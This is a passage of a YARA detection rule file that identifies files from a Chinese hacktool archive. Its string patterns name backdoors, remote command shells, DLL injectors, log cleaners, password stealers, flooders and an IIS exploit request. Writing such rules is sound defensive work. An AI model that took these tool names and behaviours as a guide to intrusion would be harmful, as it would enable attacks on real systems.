		$s0 = "Invalid COMM port specified." fullword ascii
		$s1 = "$Syntax is: SERIAL ON [comm-Port] [baud-Rate]" fullword ascii
		$s4 = "$Waiting for Soft-ICE" fullword ascii
		$s7 = "QWERTYUIO" fullword ascii
		$s8 = "$Using COMx" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_WinAircrackPack_PEEK5 {
	meta:
		description = "Chinese Hacktool Archive - file PEEK5.SYS"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "3bbf43d2be2cb6c0d84635f079716b14ea69bf7c"
	strings:
		$s1 = "PEEK5.SYS" fullword wide
		$s2 = "\\Device\\PEEK5" fullword wide
		$s5 = " 1995-2003 WildPackets, Inc." fullword wide
		$s7 = "PEEK5 Protocol Driver" fullword wide
		$s8 = "WildPackets Capture Framework" fullword wide
		$s9 = "WildPackets, Inc." fullword wide
	condition:
		all of them
}

rule CN_Hacktools_hkshell_hkshell {
	meta:
		description = "Chinese Hacktool Archive - file hkshell.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "cad8f9d4b01700cb8cbb162ab608a86dc1123b4a"
	strings:
		$s0 = "\\inject.exe" fullword ascii
		$s1 = "l32.dll" fullword ascii
		$s2 = "SeDebug" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_get {
	meta:
		description = "Chinese Hacktool Archive - file get.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "409b45331e74cd3691238a249991968d6119a5e6"
	strings:
		$s0 = "get31.exe" fullword wide
	condition:
		PEFILE and $s0
}

rule CN_Hacktools_tools_bo2k {
	meta:
		description = "Chinese Hacktool Archive - file bo2k.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0423db631b2ec242cd863edbf2b7535ae8a51cd1"
	strings:
		$s0 = "S[48]:Host process name (NT)=EXPLORER" fullword ascii
		$s3 = "S[64]:Runtime pathname=UMGR32.EXE" fullword ascii
		$s9 = "(%d) %.64s\\%.64s|%.64s|%.64s|%.64s" fullword ascii
		$s10 = "--> Version: Back Orifice 2000 (BO2K) v%1.1u.%1.1u" fullword ascii
		$s11 = "winspool.dll" fullword ascii
		$s12 = "Service Name (NT)" fullword ascii
		$s13 = "--> Extension Commands:" fullword ascii
		$s15 = "Reserved Space Read Only" fullword ascii
		$s20 = "SVRAPI.DLL" fullword ascii
	condition:
		6 of them
}

rule CN_Hacktools_tools_BTLOG {
	meta:
		description = "Chinese Hacktool Archive - file BTLOG.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "5231a70fff5e6cbe463faff7f0ad0146f77205e0"
	strings:
		$s0 = "$BTLOG.EXE extracts entries from the Soft-ICE back trace" fullword ascii
		$s1 = "Error Reading File $Error Opening Source File $NOT USED$NOT USED$NOT USED$NOT US" ascii
		$s2 = "$Soft-ICE is not loaded$BTLOG.EXE Requires Soft-ICE 2.71 or greater" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_MS05_039Scanner {
	meta:
		description = "Chinese Hacktool Archive - file MS05-039Scanner.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a425bbdfb03680c0d331580e8e2d3c7e6c41269a"
	strings:
		$s2 = "All Done! Tested %d IPs! %d are vulnerable!" fullword ascii
		$s3 = "\\\\%s\\pipe\\browser" fullword ascii
		$s19 = "Scan ended!" fullword ascii
		$s20 = "******************************************" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_public_ZXShell {
	meta:
		description = "Chinese Hacktool Archive - file public_ZXShell.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "097783449c5cfca3ef0f187153428e18db7673d2"
	strings:
		$s5 = "zxshell.exe" fullword ascii
		$s6 = "Create File Failed.(%d)" fullword ascii
		$s7 = "_ZXShell.exe" fullword ascii
		$s8 = "LoadLibrary DllFile Failed.(%d)" fullword ascii
		$s9 = "zxshell.exe (" fullword ascii
		$s17 = "%s\\%s%d%s" fullword ascii
		$s18 = "[-help] [-IP] <URL> [-Port] <port> [-FileName] <dllpath> [-test] [-del]" fullword ascii
		$s20 = "SHELLMAIN" fullword wide
	condition:
		5 of them
}

rule CN_Hacktools_tools_wollf {
	meta:
		description = "Chinese Hacktool Archive - file wollf.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b8a3d28d2f0d62f2d0cdb15b5a403641a8b1edc8"
	strings:
		$s0 = ".xfocG.org" fullword ascii
		$s11 = "Total %d" fullword ascii
		$s19 = "[Filter]" fullword ascii
		$s20 = "prompt" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_PortTunnel {
	meta:
		description = "Chinese Hacktool Archive - file PortTunnel.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b7563c1a3bab2c6a7607983670c5a287c44873ad"
	strings:
		$s7 = "<description>PortTunnel from www.SteelBytes.com</description>" fullword ascii
		$s8 = "PortTunnel CrashLog.txt" fullword ascii
		$s12 = "Translate 'PORT' and 'PASV' commands" fullword wide
		$s13 = "www.a_host.com" fullword ascii
		$s14 = "http://www.steelbytes.com" fullword ascii
		$s15 = "port_tun.exe" fullword wide
		$s18 = "%s (0.0.0.0):%i" fullword ascii
	condition:
		3 of them
}
rule CN_Hacktools_bat2exec {
	meta:
		description = "Chinese Hacktool Archive - file bat2exec.COM"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b435a9cdddb0134fb89a2663d805bea301ece6f3"
	strings:
		$s0 = "Syntax: BAT2EXEC filename.ext" fullword ascii
		$s1 = "Error in line $Need DOS 2.0 or" fullword ascii
		$s2 = "BAT2EXEC 1.0 Copyright (c) 1991 By Compu-Link Magazine" fullword ascii
		$s3 = "ERRORLEVELEXIST/C " fullword ascii
		$s4 = "Strike any key when ready..." fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_XFocus_CN_Hacktools {
	meta:
		description = "X-Focus CN Hacker Site Produced mentioned in Code"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
	strings:
		$s1 = "<br><center>Copyright &copy; 2000-2001 xfocus.org</center><br>" fullword ascii
		$s2 = "</b> <a href=\"http://www.xfocus.org\">" fullword ascii
		$s3 = "http://www.xfocus.org" fullword wide
		$s4 = "xfocus.org" fullword ascii
	condition:
		PEFILE and ( all of ($s*) )
}

rule CN_Hacktools_RangeScan {
	meta:
		description = "Chinese Hacktool Archive - file RangeScan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c407052edbed3d28d13c8c1ab767dcdfc65e2665"
	strings:
		$s0 = "RangeScan.EXE" fullword wide
		$s1 = "<br><center>Copyright &copy; 2000-2001 xfocus.org</center><br>" fullword ascii
		$s2 = "</b> <a href=\"http://www.xfocus.org\">" fullword ascii
		$s3 = "http://www.xfocus.org" fullword wide
		$s4 = "xfocus.org" fullword ascii
		$s10 = "RangeScan" fullword wide
		$s12 = "Winsock!" fullword ascii
		$s13 = "by isno" fullword wide
	condition:
		4 of them
}

rule CN_Hacktools_smtpscan {
	meta:
		description = "Chinese Hacktool Archive - file smtpscan.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "57dccd16b5e7e7423a2052eb1b84cc84b04e0150"
	strings:
		$s5 = "helo me.here.com" fullword ascii
		$s14 = "smtpscan.dll" fullword ascii
		$s15 = "<P>Server accepted \"debug\" command. This can allow remote users to execute" ascii
	condition:
		all of them
}

rule CN_Hacktools_plugins_Cpass {
	meta:
		description = "Chinese Hacktool Archive - file Cpass.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "06c21ef8de697709af86d667f23e3969ac23ecad"
	strings:
		$s8 = "\\c0mmand.com /stext " fullword wide
		$s11 = "PasswordSend" fullword ascii
		$s12 = "No Stored Passwords" fullword wide
		$s17 = "\\ycrwin32.dll" fullword wide
		$s18 = "YCRWin32.DLL" fullword ascii
		$s20 = "\\ICQ2003Decrypt.dll" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_SREngPS {
	meta:
		description = "Chinese Hacktool Archive - file SREngPS.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b500a4551731aefb2a53ea5f42e5dbe4457bc11a"
	strings:
		$s1 = "http://www.KZTechs.com" fullword ascii
		$s3 = "SREng.EXE" fullword wide
		$s4 = "Copyright (C) 2003-2007 Smallfrogs. All rights reserved." fullword wide
		$s5 = "PECompact2" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_wnt_ntid {
	meta:
		description = "Chinese Hacktool Archive - file ntid.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b2d4f8ba2c2729950888b493088ec1c0ed6c5e0f"
	strings:
		$s0 = "NT-IceDump Patcher" fullword ascii
		$s2 = "Reading Dump data : " fullword ascii
		$s3 = "icedump" fullword ascii
		$s4 = "NTICE.SYS" fullword ascii
		$s6 = "Signature  : IDMP" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_WinAircrackPack_PEEK {
	meta:
		description = "Chinese Hacktool Archive - file PEEK.DLL"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d95bb49310483947969b3a7f94e0ebbdd198a242"
	strings:
		$s3 = "PeekGetLastError" fullword ascii
		$s9 = "PEEK.DLL" fullword wide
		$s10 = "MSVCR70.dll" fullword ascii
		$s11 = "PeekGetPacketBuffer" fullword ascii
		$s19 = "PEEK4 Protocol Driver" fullword wide
		$s20 = "PeekSynchronizeTimeStamps" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_iCmd {
	meta:
		description = "Chinese Hacktool Archive - file iCmd.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a517f7435864c2182beead3bd91fc9f452dd05fd"
	strings:
		$s1 = "%s *** FAILED LOGIN ATTEMPT *** " fullword ascii
		$s4 = "\\Command.com" fullword ascii
		$s9 = "CPortManager::Stop( ) -closing listen socket" fullword ascii
		$s10 = "ERROR: Could Not Bind To Port %u" fullword ascii
		$s11 = "\\System32\\Cmd.exe" fullword ascii
		$s12 = "Waiting For Connections On Port %u" fullword ascii
		$s17 = "iCmd [password] [port]" fullword ascii
		$s19 = "<%s %s>  %s" fullword ascii
		$s20 = "iCmd Server Started." fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_NtGodMode {
	meta:
		description = "Chinese Hacktool Archive - file NtGodMode.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8baac735e37523d28fdb6e736d03c67274f7db77"
	strings:
		$s0 = "SS.EXE" fullword ascii
		$s1 = "HOST!" fullword ascii
		$s8 = "ON|OFF" fullword ascii
		$s9 = "Module" ascii
	condition:
		PEFILE and all of ($s*)
}

rule CN_Hacktools_udpflood {
	meta:
		description = "Chinese Hacktool Archive - file udpflood.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "98f116e1c11e5a6c884d6990dc86af5a1272409f"
	strings:
		$s0 = "udpflood.exe" fullword wide
		$s1 = "***** UDP Flood. Server stress test *****" fullword ascii
		$s7 = "Modem --->--- Cable --->--- T1 --->--- LAN" fullword wide
		$s9 = "UDP Flooder" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_MSDcomScanner_2 {
	meta:
		description = "Chinese Hacktool Archive - file MSDcomScanner.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "5fb429290501c6b907cf58eda326ffef648b3d8d"
	strings:
		$s4 = "host.domain.com     - fully-qualified domain name" fullword ascii
		$s5 = ": error - no log file name specified" fullword ascii
		$s6 = "Microsoft (R) KB824146 Scanner Version %d.%02d.%04d for 80x86" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_pulist {
	meta:
		description = "Chinese Hacktool Archive - file pulist.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1da2de3525ee44948c105f736395e63f9ec7aa6c"
	strings:
		$s0 = "This utility displays all the processes running on a system." fullword ascii
		$s6 = "PULIST for Windows NT v1.00 Dec 21 1999 07:44:32" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_nbtscan {
	meta:
		description = "Chinese Hacktool Archive - file nbtscan.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d9de8b3fac0bd13c5b4ec04dd68109c1107a9f27"
	strings:
		$s0 = "Creation of results file - \"%s\" failed." fullword ascii
		$s1 = "The %s account is an ADMINISTRATOR, and the password was" fullword wide
		$s8 = "<TITLE>Cerberus Internet Scanner results for %s</TITLE>" fullword ascii
		$s14 = "nbtscan.dll" fullword ascii
		$s15 = "Checking passwords on accounts..." fullword wide
		$s16 = "<P>No NetBIOS Session Service" fullword ascii
		$s20 = "%d days ago. " fullword wide
	condition:
		4 of them
}

rule CN_Hacktools_CuteIISLogClean {
	meta:
		description = "Chinese Hacktool Archive - file CuteIISLogClean.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "2a9215cbba4d4c051c82e4286e86e0bf1a78ee90"
	strings:
		$s0 = "CuteIISLogClean.exe" fullword ascii
		$s5 = "CuteIISLogClean v1.1 by shocker<shocker@c4st.cn>" fullword ascii
		$s11 = "programe will clean all log lines that include string in today's log file " fullword ascii
		$s20 = "Stopping w3svc Service .... " fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_sqlcomm {
	meta:
		description = "Chinese Hacktool Archive - file sqlcomm.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e3396aea83e47023779f5a89db8cd93d0eb28b76"
	strings:
		$s0 = "Commander" fullword ascii
		$s1 = "xlcommder.exe" fullword wide
		$s2 = "1/ust.asp?a=z" fullword ascii
		$s3 = "SQL INJ Commander" fullword wide
		$s4 = "R1DOWS\\system32\\" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_unwrap_unwrap {
	meta:
		description = "Chinese Hacktool Archive - file unwrap.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0bc9de0548726d8c5a456ddf13464f595c0442d1"
	strings:
		$s0 = "unwrap.dll" fullword ascii
		$s1 = "kernel.dll" fullword ascii
		$s2 = "!Hydra Plugin" fullword ascii
		$s4 = "IsBadPtr" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_StartTelnet {
	meta:
		description = "Chinese Hacktool Archive - file StartTelnet.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7dcbffddeeaa6966daa58974ae9801cfc033cab7"
	strings:
		$s0 = "Homepage:http://www.thugx.com http://www.fz5fz.org" fullword ascii
		$s3 = "StartTelnet <IP> <UserName> <Password> <Port>" fullword ascii
		$s4 = "http://www.thugx.com http://www.fz5fz.org" fullword ascii
		$s5 = "Email:Inetufo@thugx.com" fullword ascii
		$s8 = "You Can Telnet localhost After The System Reboot" fullword ascii
		$s9 = "StartTelnet 192.168.0.1 Administrator 123456" fullword ascii
		$s17 = "Will Be The Default Port 23" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_bo2kgui {
	meta:
		description = "Chinese Hacktool Archive - file bo2kgui.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1b136d49438f8f5bf434cedae846919b0cdf7932"
	strings:
		$s2 = "http://www.cultdeadcow.com" fullword wide
		$s16 = "bo2kgui.exe" fullword wide
		$s20 = "BO2K Workspaces (*.bow)" fullword wide
	condition:
		2 of them
}

rule CN_Hacktools_tools_xploit {
	meta:
		description = "Chinese Hacktool Archive - file xploit.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1f8156940cb239629abd66eb913c64de440c538c"
	strings:
		$s0 = "GET /default.ida?" ascii
		$s1 = ".guesswho.com" ascii
		$s2 = "hinese" ascii
		$s3 = "oit code by" ascii
		$s6 = "XPLOIT" wide
	condition:
		all of them
}

rule CN_Hacktools_ipsearcher {
	meta:
		description = "Chinese Hacktool Archive - file ipsearcher.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1e96e9c5c56fcbea94d26ce0b3f1548b224a4791"
	strings:
		$s3 = "_GetAddress" fullword ascii
		$s4 = "ipsearcher.dll" fullword ascii
		$s5 = "h:\\VC++\\" fullword ascii
		$s6 = "QQWRY.DAT" fullword ascii
		$s7 = "QQwry.dat" fullword ascii
		$s14 = "ipsearcher\\" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_THCSSLProxy {
	meta:
		description = "Chinese Hacktool Archive - file THCSSLProxy.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d6f1e974ce86d52c2ad01013c70acc13f8db9683"
	strings:
		$s0 = "THC SSL Proxy v0.1 - coding johnny cyberpunk (www.thc.org) 2004" fullword ascii
		$s1 = "THCSSLProxy localhost 443 www.thc.org 443" fullword ascii
	condition:
		1 of them
}

rule CN_Hacktools_by063cli {
	meta:
		description = "Chinese Hacktool Archive - file by063cli.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "97dff9575da055f4a16b99c7d73f0216cd35fe98"
	strings:
		$s0 = "byshell.exe -install" fullword ascii
		$s1 = "byshell.exe -remove" fullword ascii
		$s5 = "baiyuanfan@163.com" fullword ascii
		$s6 = "input the password(the default one is 'by')" fullword ascii
		$s7 = "bycli.exe" fullword ascii
		$s8 = "c:\\download\\file.txt" fullword ascii
		$s19 = "#SYN 172.18.1.5 15 1 445 12345" fullword ascii
		$s20 = "xfocus.net" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_EditServer {
	meta:
		description = "Chinese Hacktool Archive - file EditServer.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "87b29c9121cac6ae780237f7e04ee3bc1a9777d3"
	strings:
		$s2 = "%s Server.exe" fullword ascii
		$s5 = "Inject DLL Name: %s" fullword ascii
		$s9 = "@HOTMAIL.COM" fullword ascii
		$s12 = "9--Set Procecess Name To Inject DLL" fullword ascii
		$s14 = "8--Set Injected DLL Name" fullword ascii
		$s15 = "The Port Must Been >0 & <65535" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_Jphswin {
	meta:
		description = "Chinese Hacktool Archive - file Jphswin.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "63a44fe41465c920c0507907a7bda91d53f91810"
	strings:
		$s0 = "If you continue the hide process is likely to fail." fullword ascii
		$s1 = "5JPHS for WIndows - Freeware version BETA test rev 0.5" fullword wide
		$s10 = "<markus.oberhumer@jk.uni-linz.ac.at>" fullword ascii
		$s18 = "Select the file you want to hide" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_pangolin {
	meta:
		description = "Chinese Hacktool Archive - file pangolin.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d287ef5d048dd2a75def4e17a618a6e7d7259365"
	strings:
		$s0 = "pangolin.exe" fullword wide
		$s3 = "Nosec.org" fullword wide
		$s13 = "LIBCURL.DLL" fullword ascii
		$s14 = "TPASSWORDDIALOG" fullword wide
		$s15 = "SQLITE.DLL" fullword ascii
		$s18 = "VT_HEADERSPLIT" fullword wide
	condition:
		5 of them
}

rule CN_Hacktools_tools_DarkSpy {
	meta:
		description = "Chinese Hacktool Archive - file DarkSpy.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "79e6959e9110d8da91e2a18701502c22ebf23c10"
	strings:
		$s1 = "wowocock@hotmail.com" fullword wide
		$s2 = "sunmy1@sina.com" fullword wide
		$s3 = "darkspy.exe" fullword wide
		$s6 = "ntice.sys" fullword ascii
		$s10 = "\\DarkSpyKernel.sys" fullword ascii
		$s11 = "Syser.sys" fullword ascii
		$s12 = "\\ntoskrnl.exe" fullword ascii
		$s16 = "<BUTTON STYLE=\"WIDTH:100\" ID=\"ButtonOK\">OK</BUTTON><BR>" fullword ascii
	condition:
		5 of them
}

rule CN_Hacktools_NetFuke_Filter {
	meta:
		description = "Chinese Hacktool Archive - file NetFuke_Filter.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d59b78b40029c7c3a03c77637761c8512018e71d"
	strings:
		$s0 = "powered by shadow 2007/2/9 22:27" fullword ascii
		$s1 = "NetFuke_Filter.dll" fullword ascii
		$s13 = "DestIP = " fullword ascii
		$s14 = "IPType = * //TCP,UDP,ICMP,IGMP" fullword ascii
		$s16 = "NetFuke_Filter V1.0.0" fullword ascii
		$s17 = "DestIP = * //x.x.x.x" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_Achilles {
	meta:
		description = "Chinese Hacktool Archive - file Achilles.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c817e0b4fee22fa904d3ea4861c7347e9c2bf8fb"
	strings:
		$s0 = "Dasquid@digizen-security.com" fullword wide
		$s7 = "Error: Connection Refused" fullword ascii
		$s8 = "HTTP/1.0 200 Connection established" fullword ascii
		$s19 = "Mode Changes requires the Proxy to first be stopped." fullword ascii
		$s20 = "\\sample.pem" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Upload_3rdUpd {
	meta:
		description = "Chinese Hacktool Archive - file 3rdUpd.DLL"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6f26f40bcf6c40b161394a094019bb48daeb61c0"
	strings:
		$s3 = "SREng_3rdUploadDemo.dll" fullword ascii
		$s4 = "System Repair Engineer 3rd Upload Module Demo" fullword wide
		$s9 = "3rdUpd.DLL" fullword wide
		$s17 = "SRENG_PLUGIN_SetInputNum" fullword ascii
		$s18 = "{5EAB15B5-3D19-456a-976D-1533759FB495}" fullword ascii
		$s19 = "SRENG_PLUGIN_Init" fullword ascii
		$s20 = "SRENG_PLUGIN_UnInit" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_u_uay {
	meta:
		description = "Chinese Hacktool Archive - file uay.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "3762667b2118402d2eaf4377275207180fe2b27f"
	strings:
		$s3 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security" fullword ascii
		$s4 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Enum" fullword ascii
		$s7 = "cAn not find the winlogon.exe process" fullword ascii
		$s8 = "specify the port to listen.  eg: uay.exe 12345" fullword ascii
		$s11 = "\\temp_u_userinit_After.exe" fullword ascii
		$s12 = "\\temp_u_userinit_before.exe" fullword ascii
		$s13 = "It think the most vAlueAble commAnds Are:" fullword ascii
		$s18 = "uay.exe -h" fullword ascii
		$s19 = "commAndline: %s" fullword ascii
		$s20 = "defAult port is 9929,And do not chose A port AlreAdy been using" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_ext_server_sys {
	meta:
		description = "Chinese Hacktool Archive - file ext_server_sys.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "08ce102477c179c517829afae1b54f1b1efa77f7"
	strings:
		$s3 = "ext_server_sys.dll" fullword ascii
		$s4 = "metsrv.dll" fullword ascii
		$s5 = "%s (Build %lu, %s)." fullword ascii
		$s6 = "DeinitServerExtension" fullword ascii
		$s10 = "packet_create_response" fullword ascii
	condition:
		all of them
}


rule CN_Hacktools_MSWebDav_cn_2 {
	meta:
		description = "Chinese Hacktool Archive - file MSWebDav_cn_2.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "39e0dd74eb8fbeb37e7800a595514262cf9ac30b"
	strings:
		$s0 = "CONTENT=\"text/html; charset=gb231" ascii
		$s1 = "--<b>MSWebDav_cn_2.EXE</b></span>&nbsp;(MS," fullword ascii
		$s19 = "--MSWebDav_cn_2.EXE" ascii
	condition:
		all of them
}

rule CN_Hacktools_enum_enum {
	meta:
		description = "Chinese Hacktool Archive - file enum.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "86a7547ce6d772394029204a79a71e5eeaac0a47"
	strings:
		$s0 = "-N:  get namelist dump (different from -U|-M)" fullword ascii
		$s7 = "usage:  %s  [switches]  [hostname|ip]" fullword ascii
		$s20 = "-f:  specify dictfile to use (wants -D)" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_crashqq {
	meta:
		description = "Chinese Hacktool Archive - file crashqq.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ae7f7315e4f727ca0359b1c0fe52ccc6a5051a60"
	strings:
		$s0 = "crashqq.EXE" fullword wide
		$s1 = "crashqq" fullword wide
		$s2 = "crashqq Microsoft " fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_FUNNEL {
	meta:
		description = "Chinese Hacktool Archive - file FUNNEL.SYS"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "55699f246848a3c02224d2d3d01c9b46089c64b5"
	strings:
		$s0 = "Copyright (C) 1990, KLOS Technologies, Inc." fullword ascii
		$s1 = "\\  FUNNEL  /" fullword ascii
		$s2 = "\\ 2.10 /" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Nbsi2_kNBSI2 {
	meta:
		description = "Chinese Hacktool Archive - file kNBSI2.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "656a83eabfa02b4222a3fced3cd9b21ee23a456c"
	strings:
		$s0 = "NBSI2.exe" fullword wide
		$s1 = ".killer" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_EMMSETUP {
	meta:
		description = "Chinese Hacktool Archive - file EMMSETUP.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "3eab861628239fe111fced1c0722f4339bde28e8"
	strings:
		$s0 = "Copyright (c) Nu-Mega Technologies, All rights reserved" fullword ascii
		$s2 = "S-ICE.EXE" fullword ascii
		$s4 = "Example: EMMSETUP NUMEGA.SYS" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Crack_BCWipe {
	meta:
		description = "Chinese Hacktool Archive - file BCWipe.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "902de158e1b1e634b7e8a5e0cfbf51a6e28799e0"
	strings:
		$s1 = "Process MFT records(Error in getting freespace on drive '%s' Choose file" wide
		$s6 = "Wipe free space on swap file!Error get free space for drive %s" fullword wide
		$s7 = "DirEntries wiping error -  drive %s is %s instead of FAT" fullword ascii
		$s8 = "Scheme '%s' , pass %d of %d, pattern (hex) - %s" fullword wide
		$s19 = "Wipe:: Disk write error(Temporary file name '%s'" fullword wide
		$s20 = "Delete temporary files W - shortest name already exists" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_airodump {
	meta:
		description = "Chinese Hacktool Archive - file airodump.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ec840e849dc8b6c7259d6b001dbb51a502fae723"
	strings:
		$s0 = "Channel : %02d - airodump" fullword ascii
		$s1 = "airodump" fullword ascii
		$s19 = "Network interface type" fullword ascii
		$s20 = "No adapters have been detected" ascii
	condition:
		all of them
}

rule CN_Hacktools_Httphijack {
	meta:
		description = "Chinese Hacktool Archive - file Httphijack.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "2826394cdda876801345a7b4da59049b39f6ba44"
	strings:
		$s0 = "Infomonitor\\obj\\Debug\\Lcm.pdb" fullword ascii
		$s20 = "GetMACAddress" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_passivex {
	meta:
		description = "Chinese Hacktool Archive - file passivex.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "5fdc4aab9c301b9edb4a972a1da0b7fb70204c93"
	strings:
		$s9 = "PassiveX.dll" fullword wide
		$s19 = "PASSIVEX.DLL" fullword ascii
		$s20 = "TransmitToRemote(): Transmitting %lu bytes of data to the remote side of the TCP" ascii
	condition:
		all of them
}

rule CN_Hacktools_jordwts_jordwts {
	meta:
		description = "Chinese Hacktool Archive - file jordwts.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "adb5d70242c70a7d0f1c25c724bbdc37e61ff153"
	strings:
		$s0 = "Error: Unable to resolve hostname (%s)" fullword ascii
		$s5 = "Usage: %s <server> [port(%d)]" fullword ascii
		$s9 = "WINSOCK DLL Version out of range" fullword ascii
		$s10 = "web:    http://aluigi.altervista.org" fullword ascii
		$s11 = "Net dropped connection or reset" fullword ascii
		$s15 = "Successful WSASTARTUP not yet performed" fullword ascii
		$s16 = "Network SubSystem is unavailable" fullword ascii
